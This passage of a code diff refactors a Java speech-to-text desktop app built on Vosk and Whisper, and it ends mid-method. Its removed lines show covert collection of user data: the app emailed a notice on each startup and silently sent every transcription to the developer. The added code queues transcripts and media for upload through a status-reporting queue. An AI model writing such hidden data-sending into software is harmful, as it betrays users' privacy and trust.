@@ -10,16 +10,13 @@ import java.awt.*;
 import java.awt.datatransfer.StringSelection;
 import java.awt.event.ActionListener;
 import java.io.*;
-import java.net.URISyntaxException;
-import java.nio.ByteBuffer;
-import java.nio.ByteOrder;
+import java.nio.charset.StandardCharsets;
 import java.nio.file.*;
 import java.util.*;
 import java.util.prefs.Preferences;
 import java.time.Year;
 import java.util.stream.Collectors;
-import javax.mail.*;
-import javax.mail.internet.*;
+
 
 public class SpeechToTextApp extends JFrame {
     private JButton toggleButton;
@@ -31,11 +28,17 @@ public class SpeechToTextApp extends JFrame {
     private JTextArea transcriptionArea;
     private JComboBox<String> languageComboBox;
     private JComboBox<String> modelComboBox;
-    private boolean isRecording = false;
+    private volatile boolean isRecording = false;
+    private volatile TargetDataLine captureLine;
+    private boolean isConverting;
+    private boolean isLoading = true;
+    private JComboBox<String> backendComboBox;
+    private JLabel statusLabel;
+    private boolean changingLanguage;
+    private SwingWorker<?, ?> conversionWorker;
     private boolean isPlaceholderSet = true;
     private Thread audioThread;
     private Model voskModel;
-    private Recognizer recognizer;
     private ResourceBundle messages;
     private Locale currentLocale;
     private Map<String, String> modelDisplayToName;
@@ -106,7 +109,7 @@ public class SpeechToTextApp extends JFrame {
 
         // Set up GUI
         setTitle(messages.getString("window.title"));
-        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
+        setDefaultCloseOperation(JFrame.DO_NOTHING_ON_CLOSE);
         setExtendedState(JFrame.MAXIMIZED_BOTH); // Full-screen
         setLayout(new BorderLayout());
 
@@ -124,6 +127,11 @@ public class SpeechToTextApp extends JFrame {
         // Transcription display
         transcriptionArea = new JTextArea(messages.getString("transcription.placeholder"));
         transcriptionArea.setEditable(false);
+        transcriptionArea.addFocusListener(new java.awt.event.FocusAdapter() {
+            public void focusGained(java.awt.event.FocusEvent event) {
+                if (isPlaceholderSet) { transcriptionArea.setText(""); isPlaceholderSet = false; }
+            }
+        });
         transcriptionArea.setLineWrap(true);
         transcriptionArea.setWrapStyleWord(true);
         transcriptionArea.setFont(new Font("Vazir", Font.PLAIN, 14));
@@ -165,12 +173,12 @@ public class SpeechToTextApp extends JFrame {
         languageComboBox.setFont(new Font("Vazir", Font.PLAIN, 14));
 
         // Model selector
-        JLabel modelLabel = new JLabel("Model:");
+        JLabel modelLabel = new JLabel(messages.getString("label.model"));
+        modelLabel.setLabelFor(modelComboBox);
         modelLabel.setFont(new Font("Vazir", Font.PLAIN, 14));
         java.util.List<String> validModels = getValidModels();
         if (validModels.isEmpty()) {
-            JOptionPane.showMessageDialog(this, "No valid Chalabi models found in resources.", "Error", JOptionPane.ERROR_MESSAGE);
-            System.exit(1);
+            validModels.addAll(modelDisplayToName.keySet());
         }
         modelComboBox = new JComboBox<>(validModels.toArray(new String[0]));
         String preciseModelDisplay = modelNameToDisplay.get(decrypt(MODEL_NAMES[0]));
@@ -183,6 +191,18 @@ public class SpeechToTextApp extends JFrame {
         modelComboBox.setFont(new Font("Vazir", Font.PLAIN, 14));
         currentModelName = getModelNameFromDisplayName((String) modelComboBox.getSelectedItem());
 
+        backendComboBox = new JComboBox<>(new String[]{"Vosk", "Whisper"});
+        backendComboBox.getAccessibleContext().setAccessibleName(messages.getString("label.engine"));
+        controlPanel.add(new JLabel(messages.getString("label.engine")));
+        controlPanel.add(backendComboBox);
+        statusLabel = new JLabel(messages.getString("status.loading"));
+        statusLabel.getAccessibleContext().setAccessibleName(messages.getString("label.status"));
+        JPanel north = new JPanel(new BorderLayout());
+        north.add(statusLabel, BorderLayout.CENTER);
+        JButton retry = new JButton(messages.getString("button.retry_upload"));
+        retry.addActionListener(e -> UploadQueue.retry(this::uploadStatus));
+        north.add(retry, BorderLayout.LINE_END);
+        add(north, BorderLayout.NORTH);
         controlPanel.add(toggleButton);
         controlPanel.add(shareButton);
         controlPanel.add(saveButton);
@@ -199,9 +219,26 @@ public class SpeechToTextApp extends JFrame {
         setLocationRelativeTo(null);
 
         initializeCounter();
-        initializeVosk();
-
-        sendEmail("chalabi started", "chalabi started");
+        configureAccessibility();
+        updateBusyControls();
+        loadModelAsync(currentModelName);
+        addWindowListener(new java.awt.event.WindowAdapter() {
+            public void windowClosing(java.awt.event.WindowEvent e) {
+                stopAudioCapture();
+                Thread pending = audioThread;
+                SwingWorker<?, ?> pendingConversion = conversionWorker;
+                isConverting = true;
+                updateBusyControls();
+                new Thread(() -> {
+                    try {
+                        if (pending != null) pending.join();
+                        if (pendingConversion != null) pendingConversion.get();
+                    } catch (InterruptedException ex) { Thread.currentThread().interrupt(); }
+                    catch (java.util.concurrent.ExecutionException ignored) { }
+                    SwingUtilities.invokeLater(() -> { dispose(); System.exit(0); });
+                }, "application-close").start();
+            }
+        });
     }
 
     private void showAboutDialog() {
@@ -242,21 +279,20 @@ public class SpeechToTextApp extends JFrame {
     }
 
     private void initializeModelMaps() {
-        modelDisplayToName = Map.of(
-                messages.getString("model.precise"), decrypt(MODEL_NAMES[0]),
-                messages.getString("model.fast"), decrypt(MODEL_NAMES[1])
-        );
-        modelNameToDisplay = Map.of(
-                decrypt(MODEL_NAMES[0]), messages.getString("model.precise"),
-                decrypt(MODEL_NAMES[1]), messages.getString("model.fast")
-        );
+        modelDisplayToName = new LinkedHashMap<>();
+        modelDisplayToName.put(messages.getString("model.precise"), decrypt(MODEL_NAMES[0]));
+        modelDisplayToName.put(messages.getString("model.fast"), decrypt(MODEL_NAMES[1]));
+        for (String name : new String[]{"vosk-model-fa-0.5", "vosk-model-small-fa-0.5", "vosk-model-small-fa-0.4"})
+            modelDisplayToName.put(name, name);
+        modelNameToDisplay = new LinkedHashMap<>();
+        modelDisplayToName.forEach((display, name) -> modelNameToDisplay.put(name, display));
     }
 
     private java.util.List<String> getValidModels() {
         java.util.List<String> validModels = new ArrayList<>();
         for (String modelName : modelDisplayToName.values()) {
             String resourcePath = "model/" + modelName + "/" + decrypt(REQUIRED_MODEL_FILES.get(0));
-            if (getClass().getClassLoader().getResource(resourcePath) != null) {
+            if (externalModel(modelName) != null || getClass().getClassLoader().getResource(resourcePath) != null) {
                 validModels.add(modelNameToDisplay.get(modelName));
             }
         }
@@ -270,68 +306,67 @@ public class SpeechToTextApp extends JFrame {
         return modelDisplayToName.get(displayName);
     }
 
-    private void initializeVosk() {
+    private Path externalModel(String modelName) {
+        java.util.List<Path> roots = new ArrayList<>();
+        String configured = AppSettings.get("models.dir", "");
+        if (!configured.isBlank()) roots.add(Path.of(configured));
+        roots.add(Path.of("model"));
+        roots.add(Path.of("src", "main", "resources", "model"));
         try {
-            LibVosk.setLogLevel(LogLevel.DEBUG);
-            String selectedDisplayName = (String) modelComboBox.getSelectedItem();
-            String modelName = getModelNameFromDisplayName(selectedDisplayName);
-            if (modelName != null) {
-                loadModel(modelName);
-                currentModelName = modelName;
-            } else {
-                throw new Exception("Failed to find model for: " + selectedDisplayName);
-            }
-        } catch (Exception e) {
-            String errorMessage = "Error initializing Chalabi: " + (e.getMessage() != null ? e.getMessage() : "Unknown error");
-            SwingUtilities.invokeLater(() -> {
-                transcriptionArea.setText(errorMessage);
-                isPlaceholderSet = false;
-                JOptionPane.showMessageDialog(this, errorMessage, "Error", JOptionPane.ERROR_MESSAGE);
-            });
+            Path code = Path.of(getClass().getProtectionDomain().getCodeSource().getLocation().toURI());
+            roots.add(code.getParent().resolve("model"));
+        } catch (Exception ignored) { }
+        for (Path root : roots) {
+            Path candidate = root.resolve(modelName);
+            if (Files.isRegularFile(candidate.resolve("am/final.mdl"))) return candidate;
         }
+        return null;
     }
 
     private void loadModel(String modelName) throws IOException {
-        if (voskModel != null) {
-            voskModel.close();
-            voskModel = null;
-            recognizer = null;
+        Path modelPath = externalModel(modelName);
+        if (modelPath == null) {
+            Path tempDir = Files.createTempDirectory("vosk-model");
+            tempDir.toFile().deleteOnExit();
+            extractModelFromJar("model/" + modelName, tempDir);
+            modelPath = tempDir.resolve(modelName);
         }
-        Path tempDir = Files.createTempDirectory("vosk-model");
-        tempDir.toFile().deleteOnExit();
-        String modelResource = "model/" + modelName;
-        extractModelFromJar(modelResource, tempDir);
-        String modelPath = tempDir.resolve(modelName).toString();
-        voskModel = new Model(modelPath);
-        recognizer = new Recognizer(voskModel, 16000.0f);
-        recognizer.setWords(true);
-        recognizer.setMaxAlternatives(0);
-        recognizer.setPartialWords(true);
+        Model replacement = new Model(modelPath.toString());
+        if (voskModel != null) voskModel.close();
+        voskModel = replacement;
+    }
+
+    private void loadModelAsync(String modelName) {
+        isLoading = true;
+        statusLabel.setText(messages.getString("status.loading"));
+        updateBusyControls();
+        new SwingWorker<Void, Void>() {
+            protected Void doInBackground() throws Exception {
+                LibVosk.setLogLevel(LogLevel.WARNINGS);
+                loadModel(modelName);
+                return null;
+            }
+            protected void done() {
+                try {
+                    get();
+                    currentModelName = modelName;
+                    statusLabel.setText(messages.getString("status.ready"));
+                } catch (Exception ex) {
+                    modelComboBox.setSelectedItem(modelNameToDisplay.get(currentModelName));
+                    statusLabel.setText(messages.getString("status.model_failed"));
+                    JOptionPane.showMessageDialog(SpeechToTextApp.this,
+                            messages.getString("status.model_failed") + ": " + ex.getMessage(), "Error", JOptionPane.ERROR_MESSAGE);
+                }
+                isLoading = false;
+                updateBusyControls();
+            }
+        }.execute();
     }
 
     private void changeModel() {
-        if (isRecording) {
-            toggleRecording();
-        }
-        try {
-            String selectedDisplayName = (String) modelComboBox.getSelectedItem();
-            String selectedModel = getModelNameFromDisplayName(selectedDisplayName);
-            if (selectedModel != null && !selectedModel.equals(currentModelName)) {
-                loadModel(selectedModel);
-                currentModelName = selectedModel;
-                SwingUtilities.invokeLater(() -> {
-                    transcriptionArea.setText(messages.getString("transcription.placeholder"));
-                    isPlaceholderSet = true;
-                });
-            }
-        } catch (Exception e) {
-            String errorMessage = "Error loading model: " + (e.getMessage() != null ? e.getMessage() : "Unknown error");
-            SwingUtilities.invokeLater(() -> {
-                transcriptionArea.setText(errorMessage);
-                isPlaceholderSet = false;
-                JOptionPane.showMessageDialog(this, errorMessage, "Error", JOptionPane.ERROR_MESSAGE);
-            });
-        }
+        if (isLoading || isRecording || isConverting || audioThread != null) return;
+        String selected = getModelNameFromDisplayName((String) modelComboBox.getSelectedItem());
+        if (selected != null && !selected.equals(currentModelName)) loadModelAsync(selected);
     }
 
     private void extractModelFromJar(String resourcePath, Path targetDir) throws IOException {
@@ -371,14 +406,16 @@ public class SpeechToTextApp extends JFrame {
                 if (resourceUrl.getProtocol().equals("file")) {
                     File dir = new File(resourceUrl.toURI());
                     if (dir.isDirectory()) {
-                        Files.walk(dir.toPath())
-                                .filter(Files::isRegularFile)
-                                .map(path -> normalizedBasePath + dir.toPath().relativize(path).toString().replace("\\", "/"))
-                                .forEach(files::add);
+                        try (var paths = Files.walk(dir.toPath())) {
+                            paths.filter(Files::isRegularFile)
+                                    .map(path -> normalizedBasePath + dir.toPath().relativize(path).toString().replace("\\", "/"))
+                                    .forEach(files::add);
+                        }
                     }
                 } else if (resourceUrl.getProtocol().equals("jar")) {
-                    String jarPath = resourceUrl.getPath().substring(5, resourceUrl.getPath().indexOf("!"));
-                    try (java.util.jar.JarFile jar = new java.util.jar.JarFile(jarPath)) {
+                    java.net.JarURLConnection connection = (java.net.JarURLConnection) resourceUrl.openConnection();
+                    connection.setUseCaches(false);
+                    try (java.util.jar.JarFile jar = connection.getJarFile()) {
                         jar.entries().asIterator().forEachRemaining(entry -> {
                             String name = entry.getName();
                             if (name.startsWith(normalizedBasePath) && !name.equals(normalizedBasePath) && !entry.isDirectory()) {
@@ -406,331 +443,240 @@ public class SpeechToTextApp extends JFrame {
     }
 
     private void convertMp3ToText() {
-        String filePath = filePathField.getText();
-        if (filePath.isEmpty()) {
-            JOptionPane.showMessageDialog(this, messages.getString("error.no_file_selected"));
-            return;
-        }
-        File mediaFile = new File(filePath);
-        if (!mediaFile.exists()) {
+        if (isLoading || isRecording || isConverting || audioThread != null) return;
+        File mediaFile = new File(filePathField.getText());
+        if (!mediaFile.isFile()) {
             JOptionPane.showMessageDialog(this, messages.getString("error.file_not_found"));
             return;
         }
-        convertButton.setEnabled(false);
-        transcriptionArea.setText(messages.getString("message.converting"));
-        isPlaceholderSet = false;
-        new Thread(() -> {
-            try {
-                File wavFile = convertMediaToWav(mediaFile);
-                String transcription = transcribeWavFile(wavFile);
-                SwingUtilities.invokeLater(() -> {
-                    if (transcriptionArea.getText().equals(messages.getString("transcription.placeholder")) ||
-                            transcriptionArea.getText().equals(messages.getString("message.converting"))) {
-                        transcriptionArea.setText("");
-                    }
-                    transcriptionArea.setText(transcription);
-                    convertButton.setEnabled(true);
-                    isPlaceholderSet = false;
-                    incrementCounter();
-                    if (!transcription.trim().isEmpty()) {
-                        sendEmail("new transcription:" + transcriptionCount , transcription);
-                    }
-                });
-                wavFile.delete();
-                File tempDir = wavFile.getParentFile();
-                if (tempDir.isDirectory() && tempDir.list().length == 0) {
-                    tempDir.delete();
-                }
-            } catch (Exception e) {
-                String errorMessage = messages.getString("error.conversion_failed") + ": " + e.getMessage();
-                SwingUtilities.invokeLater(() -> {
-                    transcriptionArea.setText(errorMessage);
-                    convertButton.setEnabled(true);
-                    isPlaceholderSet = false;
-                    JOptionPane.showMessageDialog(this, errorMessage,
-                            messages.getString("error.conversion_failed"),
-                            JOptionPane.ERROR_MESSAGE);
-                });
+        final boolean whisper = "Whisper".equals(backendComboBox.getSelectedItem());
+        isConverting = true;
+        updateBusyControls();
+        statusLabel.setText(messages.getString("message.converting"));
+        conversionWorker = new SwingWorker<String, Void>() {
+            protected String doInBackground() throws Exception {
+                File wav = convertMediaToWav(mediaFile);
+                try {
+                    String text = whisper ? WhisperBackend.transcribe(wav.toPath()) : transcribeWavFile(wav);
+                    queueUpload(text, mediaFile.toPath());
+                    return text;
+                } finally { deleteTemporaryWav(wav.toPath()); }
             }
-        }).start();
+            protected void done() {
+                isConverting = false;
+                try {
+                    String text = get();
+                    transcriptionArea.setText(text);
+                    isPlaceholderSet = false;
+                    statusLabel.setText(messages.getString("message.conversion_complete"));
+                    incrementCounter();
+                } catch (Exception ex) {
+                    statusLabel.setText(messages.getString("error.conversion_failed"));
+                    JOptionPane.showMessageDialog(SpeechToTextApp.this, ex.getMessage(),
+                            messages.getString("error.conversion_failed"), JOptionPane.ERROR_MESSAGE);
+                }
+                conversionWorker = null;
+                updateBusyControls();
+            }
+        };
+        conversionWorker.execute();
+    }
+
+    private boolean queueUpload(String text, Path media) {
+        if (text.isBlank() || !UploadQueue.enabled()) return false;
+        try { UploadQueue.enqueue(text, media, this::uploadStatus); return true; }
+        catch (IOException ex) { uploadStatus("upload.queue_failed"); return false; }
+    }
+
+    private void uploadStatus(String key) {
+        SwingUtilities.invokeLater(() -> {
+            String text = messages.getString(key);
+            statusLabel.setText(text);
+            if (key.equals("upload.failed") || key.equals("upload.queue_failed"))
+                JOptionPane.showMessageDialog(this, text);
+        });
+    }
+
+    private static void deleteTemporaryWav(Path wav) throws IOException {
+        Files.deleteIfExists(wav);
+        Files.deleteIfExists(wav.getParent());
     }
 
     private File convertMediaToWav(File mediaFile) throws IOException, InterruptedException {
-        Path tempDir = Files.createTempDirectory("audio");
-        File wavFile = new File(tempDir.toFile(), "converted.wav");
-        wavFile.deleteOnExit();
-        String appDir;
-        try {
-            appDir = new File(SpeechToTextApp.class.getProtectionDomain()
-                    .getCodeSource().getLocation().toURI()).getParent();
-        } catch (URISyntaxException e) {
-            throw new IOException("Failed to resolve application directory", e);
-        }
-        java.util.List<String> ffmpegPaths = Arrays.asList(
-                new File(appDir, "tools\\ffmpeg\\bin\\ffmpeg.exe").getAbsolutePath(),
-                new File(appDir, "..\\tools\\ffmpeg\\bin\\ffmpeg.exe").getAbsolutePath(),
-                "ffmpeg"
-        );
-        String ffmpegPath = null;
-        for (String path : ffmpegPaths) {
-            if (path.equals("ffmpeg") || new File(path).isFile()) {
-                ffmpegPath = path;
-                break;
-            }
-        }
-        if (ffmpegPath == null) {
-            throw new IOException("FFmpeg executable not found. Ensure it is in tools\\ffmpeg\\bin relative to the application or in system PATH.");
-        }
-        ProcessBuilder pb = new ProcessBuilder(
-                ffmpegPath,
-                "-y",
-                "-i", mediaFile.getAbsolutePath(),
-                "-ar", "16000",
-                "-ac", "1",
-                "-acodec", "pcm_s16le",
-                "-f", "wav",
-                wavFile.getAbsolutePath()
-        );
-        pb.directory(new File(appDir));
-        pb.redirectErrorStream(true);
-        Process process = pb.start();
-        try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
-            while (reader.readLine() != null) {
-                // Consume input without logging
-            }
-        }
-        int exitCode = process.waitFor();
-        if (exitCode != 0) {
-            throw new IOException("FFmpeg conversion failed with exit code: " + exitCode);
-        }
-        return wavFile;
+        return MediaConverter.convert(mediaFile.toPath()).toFile();
     }
 
     private String transcribeWavFile(File wavFile) throws Exception {
-        if (recognizer == null) {
-            throw new IllegalStateException("Recognizer not initialized");
-        }
+        if (voskModel == null) throw new IllegalStateException("Model not initialized");
         StringBuilder transcription = new StringBuilder();
-        AudioInputStream wavStream = AudioSystem.getAudioInputStream(wavFile);
-        byte[] buffer = new byte[4096];
-        int bytesRead;
-        while ((bytesRead = wavStream.read(buffer)) != -1) {
-            buffer = normalizeAudio(buffer, bytesRead);
-            if (recognizer.acceptWaveForm(buffer, bytesRead)) {
-                String result = recognizer.getResult();
-                String text = parseVoskResult(result);
-                if (!text.isEmpty()) {
-                    transcription.append(text).append("\n");
+        // A decoder belongs to one recording only; never reuse the microphone decoder.
+        try (Recognizer fileRecognizer = new Recognizer(voskModel, 16000.0f);
+             AudioInputStream wavStream = AudioSystem.getAudioInputStream(wavFile)) {
+            byte[] buffer = new byte[4096];
+            int bytesRead;
+            while ((bytesRead = wavStream.read(buffer)) != -1) {
+                if (bytesRead > 0 && fileRecognizer.acceptWaveForm(buffer, bytesRead)) {
+                    appendResult(transcription, fileRecognizer.getResult());
                 }
             }
+            appendResult(transcription, fileRecognizer.getFinalResult());
         }
-        String finalResult = recognizer.getFinalResult();
-        String finalText = parseVoskResult(finalResult);
-        if (!finalText.isEmpty()) {
-            transcription.append(finalText).append("\n");
-        }
-        wavStream.close();
         return transcription.toString();
     }
 
-    private byte[] normalizeAudio(byte[] buffer, int bytesRead) {
-        if (bytesRead <= 0) return buffer;
-        ByteBuffer bb = ByteBuffer.wrap(buffer, 0, bytesRead).order(ByteOrder.LITTLE_ENDIAN);
-        short[] samples = new short[bytesRead / 2];
-        double maxAmplitude = 0;
-        for (int i = 0; i < samples.length; i++) {
-            samples[i] = bb.getShort();
-            maxAmplitude = Math.max(maxAmplitude, Math.abs(samples[i]));
-        }
-        if (maxAmplitude > 0 && maxAmplitude < 30000) {
-            double gain = 32760.0 / maxAmplitude;
-            if (gain > 1.0) {
-                for (int i = 0; i < samples.length; i++) {
-                    samples[i] = (short) Math.min(Math.max(samples[i] * gain, -32768), 32767);
-                }
-                bb.rewind();
-                for (short sample : samples) {
-                    bb.putShort(sample);
-                }
-            }
-        }
-        return bb.array();
+    private void appendResult(StringBuilder target, String json) {
+        String text = parseVoskResult(json);
+        if (!text.isEmpty()) target.append(text).append("\n");
     }
 
     private void toggleRecording() {
-        if (!isRecording) {
-            if (voskModel == null || recognizer == null) {
-                SwingUtilities.invokeLater(() -> {
-                    transcriptionArea.setText("Chalabi not initialized properly");
-                    isPlaceholderSet = false;
-                    JOptionPane.showMessageDialog(this, "Chalabi not initialized properly", "Error", JOptionPane.ERROR_MESSAGE);
-                });
-                return;
+        if (isConverting || isLoading) return;
+        if (isRecording) { stopAudioCapture(); return; }
+        if (audioThread != null) return;
+        final boolean whisper = "Whisper".equals(backendComboBox.getSelectedItem());
+        if (!whisper && voskModel == null) {
+            JOptionPane.showMessageDialog(this, messages.getString("status.model_failed"));
+            return;
+        }
+        isRecording = true;
+        toggleButton.setText(messages.getString("button.stop"));
+        statusLabel.setText(messages.getString("status.recording"));
+        audioThread = new Thread(() -> captureAudio(whisper), "microphone-capture");
+        audioThread.start();
+        updateBusyControls();
+    }
+
+    private void captureAudio(boolean whisper) {
+        Path directory = null;
+        boolean queued = false;
+        StringBuilder sessionText = new StringBuilder();
+        try {
+            Path recordings = AppSettings.dataDirectory().resolve("recordings");
+            Files.createDirectories(recordings);
+            directory = Files.createTempDirectory(recordings, "session-");
+            Path pcm = directory.resolve("recording.pcm");
+            Path wav = directory.resolve("recording.wav");
+            AudioFormat format = new AudioFormat(16000, 16, 1, true, false);
+            DataLine.Info info = new DataLine.Info(TargetDataLine.class, format);
+            TargetDataLine line = openMicrophone(info, format);
+            captureLine = line;
+            try (OutputStream audio = Files.newOutputStream(pcm);
+                 Recognizer decoder = whisper ? null : new Recognizer(voskModel, 16000.0f)) {
+                if (isRecording) line.start();
+                byte[] buffer = new byte[2048];
+                while (isRecording) {
+                    int count;
+                    try { count = line.read(buffer, 0, buffer.length); }
+                    catch (IllegalStateException ex) { if (isRecording) throw ex; else break; }
+                    if (count <= 0) break;
+                    audio.write(buffer, 0, count);
+                    // Keep the original PCM levels; avoid amplifying silence/noise.
+                    if (decoder != null && decoder.acceptWaveForm(buffer, count)) {
+                        String text = parseVoskResult(decoder.getResult());
+                        appendSession(sessionText, text);
+                        appendTranscription(text);
+                    }
+                }
+                if (decoder != null) {
+                    String text = parseVoskResult(decoder.getFinalResult());
+                    appendSession(sessionText, text);
+                    appendTranscription(text);
+                }
+            } finally { line.stop(); line.close(); captureLine = null; }
+            writePcmWave(pcm, wav, format);
+            if (whisper && Files.size(pcm) > 0) {
+                SwingUtilities.invokeLater(() -> statusLabel.setText(messages.getString("message.converting")));
+                String text = WhisperBackend.transcribe(wav);
+                appendSession(sessionText, text);
+                appendTranscription(text);
             }
-            isRecording = true;
-            toggleButton.setText(messages.getString("button.stop"));
-            startAudioCapture();
-        } else {
+            Files.writeString(directory.resolve("transcript.txt"), sessionText.toString());
+            queued = queueUpload(sessionText.toString(), wav);
+        } catch (Exception ex) {
+            SwingUtilities.invokeLater(() -> JOptionPane.showMessageDialog(this,
+                    messages.getString("error.recording") + ": " + ex.getMessage(), "Error", JOptionPane.ERROR_MESSAGE));
+        } finally {
+            TargetDataLine line = captureLine;
+            captureLine = null;
+            if (line != null) { line.stop(); line.close(); }
+            if (directory != null) {
+                try {
+                    Path pcm = directory.resolve("recording.pcm");
+                    Path wav = directory.resolve("recording.wav");
+                    if (!Files.exists(wav) && Files.exists(pcm))
+                        writePcmWave(pcm, wav, new AudioFormat(16000, 16, 1, true, false));
+                    Files.deleteIfExists(pcm);
+                    if (!Files.exists(directory.resolve("transcript.txt")))
+                        Files.writeString(directory.resolve("transcript.txt"), sessionText.toString());
+                    if (queued) {
+                        Files.deleteIfExists(directory.resolve("recording.wav"));
+                        Files.deleteIfExists(directory.resolve("transcript.txt"));
+                        Files.deleteIfExists(directory);
+                    }
+                } catch (IOException ignored) { }
+            }
             isRecording = false;
-            toggleButton.setText(messages.getString("button.start"));
-            stopAudioCapture();
-            String transcription = transcriptionArea.getText();
-            if (!transcription.trim().isEmpty() && !transcription.equals(messages.getString("transcription.placeholder"))) {
-                sendEmail("new transcription:" + transcriptionCount, transcription);
-            }
+            SwingUtilities.invokeLater(() -> {
+                audioThread = null;
+                toggleButton.setText(messages.getString("button.start"));
+                if (statusLabel.getText().equals(messages.getString("status.recording"))
+                        || statusLabel.getText().equals(messages.getString("message.converting")))
+                    statusLabel.setText(messages.getString("status.ready"));
+                updateBusyControls();
+            });
         }
     }
 
-    private void startAudioCapture() {
-        audioThread = new Thread(() -> {
+    private static void writePcmWave(Path pcm, Path wav, AudioFormat format) throws IOException {
+        try (InputStream input = Files.newInputStream(pcm);
+             AudioInputStream stream = new AudioInputStream(input, format, Files.size(pcm) / format.getFrameSize())) {
+            AudioSystem.write(stream, AudioFileFormat.Type.WAVE, wav.toFile());
+        }
+    }
+
+    private static TargetDataLine openMicrophone(DataLine.Info info, AudioFormat format) throws LineUnavailableException {
+        java.util.List<Mixer> mixers = new ArrayList<>();
+        mixers.add(AudioSystem.getMixer(null));
+        for (Mixer.Info mixer : AudioSystem.getMixerInfo()) mixers.add(AudioSystem.getMixer(mixer));
+        for (Mixer mixer : mixers) {
+            if (!mixer.isLineSupported(info)) continue;
+            TargetDataLine candidate = null;
             try {
-                AudioFormat format = new AudioFormat(16000, 16, 1, true, false);
-                DataLine.Info info = new DataLine.Info(TargetDataLine.class, format);
-
-                if (!AudioSystem.isLineSupported(info)) {
-                    String errorMessage = "Audio format not supported: 16kHz, 16-bit, mono";
-                    SwingUtilities.invokeLater(() -> {
-                        transcriptionArea.setText(errorMessage);
-                        isPlaceholderSet = false;
-                        JOptionPane.showMessageDialog(this, errorMessage, "Error", JOptionPane.ERROR_MESSAGE);
-                        toggleButton.setText(messages.getString("button.start"));
-                        isRecording = false;
-                    });
-                    return;
-                }
-
-                TargetDataLine line = null;
-                try {
-                    line = (TargetDataLine) AudioSystem.getLine(info);
-                    line.open(format);
-                } catch (LineUnavailableException e) {
-                    Mixer.Info[] mixers = AudioSystem.getMixerInfo();
-                    for (Mixer.Info mixerInfo : mixers) {
-                        Mixer mixer = AudioSystem.getMixer(mixerInfo);
-                        if (mixer.isLineSupported(info)) {
-                            try {
-                                line = (TargetDataLine) mixer.getLine(info);
-                                line.open(format);
-                                break;
-                            } catch (LineUnavailableException ex) {
-                                // Suppress logging
-                            }
-                        }
-                    }
-                }
-
-                if (line == null) {
-                    String errorMessage = "No suitable microphone found";
-                    SwingUtilities.invokeLater(() -> {
-                        transcriptionArea.setText(errorMessage);
-                        isPlaceholderSet = false;
-                        JOptionPane.showMessageDialog(this, errorMessage, "Error", JOptionPane.ERROR_MESSAGE);
-                        toggleButton.setText(messages.getString("button.start"));
-                        isRecording = false;
-                    });
-                    return;
-                }
-
-                line.start();
-//                recognizer.reset();   // clears lattice, adaptation, everything → stays fast for hours
-                if (voskModel != null) {
-                    recognizer = new Recognizer(voskModel, 16000.0f);
-                    recognizer.setWords(true);
-                    recognizer.setMaxAlternatives(0);
-                    recognizer.setPartialWords(true);
-                }
-
-                byte[] buffer = new byte[2048];
-                StringBuilder transcriptionBuffer = new StringBuilder();
-                long lastUpdateTime = System.currentTimeMillis();
-                while (isRecording) {
-                    int bytesRead = line.read(buffer, 0, buffer.length);
-                    buffer = normalizeAudio(buffer, bytesRead);
-                    if (bytesRead > 0 && recognizer.acceptWaveForm(buffer, bytesRead)) {
-                        String result = recognizer.getResult();
-                        String text = parseVoskResult(result);
-                        if (!text.isEmpty()) {
-                            transcriptionBuffer.append(text).append("\n");
-                            long currentTime = System.currentTimeMillis();
-                            if (currentTime - lastUpdateTime >= 500) {
-                                String finalText = transcriptionBuffer.toString();
-                                SwingUtilities.invokeLater(() -> {
-                                    if (transcriptionArea.getText().equals(messages.getString("transcription.placeholder"))) {
-                                        transcriptionArea.setText("");
-                                    }
-                                    transcriptionArea.append(finalText);
-                                    transcriptionArea.setCaretPosition(transcriptionArea.getDocument().getLength());
-                                    isPlaceholderSet = false;
-                                });
-                                transcriptionBuffer.setLength(0);
-                                lastUpdateTime = currentTime;
-                            }
-                        }
-                    }
-                }
-                line.stop();
-                line.close();
-
-                if (transcriptionBuffer.length() > 0) {
-                    String finalText = transcriptionBuffer.toString();
-                    SwingUtilities.invokeLater(() -> {
-                        if (transcriptionArea.getText().equals(messages.getString("transcription.placeholder"))) {
-                            transcriptionArea.setText("");
-                        }
-                        transcriptionArea.append(finalText);
-                        transcriptionArea.setCaretPosition(transcriptionArea.getDocument().getLength());
-                        isPlaceholderSet = false;
-                    });
-                }
-
-                String finalResult = recognizer.getFinalResult();
-                String finalText = parseVoskResult(finalResult);
-                if (!finalText.isEmpty()) {
-                    SwingUtilities.invokeLater(() -> {
-                        if (transcriptionArea.getText().equals(messages.getString("transcription.placeholder"))) {
-                            transcriptionArea.setText("");
-                        }
-                        transcriptionArea.append(finalText + "\n");
-                        transcriptionArea.setCaretPosition(transcriptionArea.getDocument().getLength());
-                        isPlaceholderSet = false;
-                    });
-                }
-            } catch (Exception e) {
-                String errorMessage = "Audio capture error: " + e.getMessage();
-                SwingUtilities.invokeLater(() -> {
-                    transcriptionArea.append(errorMessage + "\n");
-                    isPlaceholderSet = false;
-                    JOptionPane.showMessageDialog(this, errorMessage, "Error", JOptionPane.ERROR_MESSAGE);
-                    toggleButton.setText(messages.getString("button.start"));
-                    isRecording = false;
-                });
+                candidate = (TargetDataLine) mixer.getLine(info);
+                candidate.open(format);
+                return candidate;
+            } catch (LineUnavailableException | IllegalArgumentException ex) {
+                if (candidate != null) candidate.close();
             }
+        }
+        throw new LineUnavailableException("No microphone supports 16 kHz mono PCM");
+    }
+
+    private static void appendSession(StringBuilder session, String text) {
+        if (!text.isBlank()) session.append(text).append("\n");
+    }
+
+    private void appendTranscription(String text) {
+        if (text.isBlank()) return;
+        SwingUtilities.invokeLater(() -> {
+            if (isPlaceholderSet) transcriptionArea.setText("");
+            isPlaceholderSet = false;
+            transcriptionArea.append(text + "\n");
+            transcriptionArea.setCaretPosition(transcriptionArea.getDocument().getLength());
         });
-        audioThread.start();
     }
 
     private void stopAudioCapture() {
         isRecording = false;
-        if (audioThread != null) {
-            try {
-                audioThread.join();
-            } catch (InterruptedException e) {
-                // Suppress logging
-            }
-        }
+        toggleButton.setText(messages.getString("button.start"));
+        // Close on a worker: some drivers block stop/close while a read is pending.
+        TargetDataLine line = captureLine;
+        if (line != null) new Thread(() -> { line.stop(); line.close(); }, "microphone-stop").start();
+        updateBusyControls();
     }
 
     private String parseVoskResult(String result) {
-        try {
-            if (result != null && result.contains("\"text\"")) {
-                String text = result.split("\"text\"\\s*:\\s*\"")[1];
-                text = text.split("\"")[0];
-                return text;
